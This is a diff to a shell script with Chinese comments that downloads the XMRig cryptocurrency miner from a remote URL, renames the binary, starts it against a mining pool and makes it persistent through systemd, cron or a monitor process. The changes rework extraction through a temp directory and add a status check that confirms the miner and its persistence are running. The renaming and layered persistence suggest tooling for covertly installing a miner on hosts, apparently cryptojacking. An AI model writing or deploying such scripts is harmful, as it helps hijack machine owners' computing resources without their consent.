@@ -38,17 +38,33 @@ init_env() {
 deploy_bin() {
     if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
         echo "[*] 下载 ${BIN_NAME}..."
-        $DOWNLOAD "$REPO_URL" | tar -xz --strip-components=1 -C "$STORE_DIR" "xmrig-6.22.2/xmrig"
+        # 创建临时目录
+        TEMP_DIR="${STORE_DIR}/temp"
+        mkdir -p "$TEMP_DIR"
+        
+        # 下载并解压到临时目录
+        $DOWNLOAD "$REPO_URL" | tar -xz -C "$TEMP_DIR"
         if [ $? -ne 0 ]; then
             echo "[-] 下载或解压失败"
+            rm -rf "$TEMP_DIR"
             exit 1
         fi
-        echo "[+] 下载完成，正在设置权限..."
-        # 如果目标文件已存在，先删除
-        [ -f "${STORE_DIR}/${BIN_NAME}" ] && rm -f "${STORE_DIR}/${BIN_NAME}"
-        # 移动文件
-        mv "${STORE_DIR}/xmrig" "${STORE_DIR}/${BIN_NAME}"
+        
+        # 查找解压后的文件
+        BIN_PATH=$(find "$TEMP_DIR" -name "xmrig" -type f | head -n 1)
+        if [ -z "$BIN_PATH" ]; then
+            echo "[-] 未找到二进制文件"
+            rm -rf "$TEMP_DIR"
+            exit 1
+        fi
+        
+        # 移动文件到目标位置
+        mv "$BIN_PATH" "${STORE_DIR}/${BIN_NAME}"
         chmod +x "${STORE_DIR}/${BIN_NAME}"
+        
+        # 清理临时目录
+        rm -rf "$TEMP_DIR"
+        
         if [ ! -x "${STORE_DIR}/${BIN_NAME}" ]; then
             echo "[-] 权限设置失败"
             exit 1
@@ -115,12 +131,38 @@ EOF
     fi
 }
 
+### 检查进程状态 ###
+check_status() {
+    # 检查主进程
+    if pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
+        echo "[+] 主进程运行中"
+        return 0
+    fi
+    
+    # 检查持久化方式
+    if [ -f "/etc/systemd/system/${BIN_NAME}.service" ]; then
+        echo "[+] Systemd 服务已配置"
+        return 0
+    elif crontab -l 2>/dev/null | grep -q "${BIN_NAME}.*${POOL}"; then
+        echo "[+] Cron 任务已配置"
+        return 0
+    elif pgrep -f "monitor_func" >/dev/null; then
+        echo "[+] 监控进程运行中"
+        return 0
+    fi
+    
+    echo "[-] 未检测到运行中的进程"
+    return 1
+}
+
 ### 主流程 ###
 main() {
     init_env
     deploy_bin
     start_process
     setup_persistence
+    # 检查状态
+    check_status
     # 立即退出，不等待
     exit 0
 }
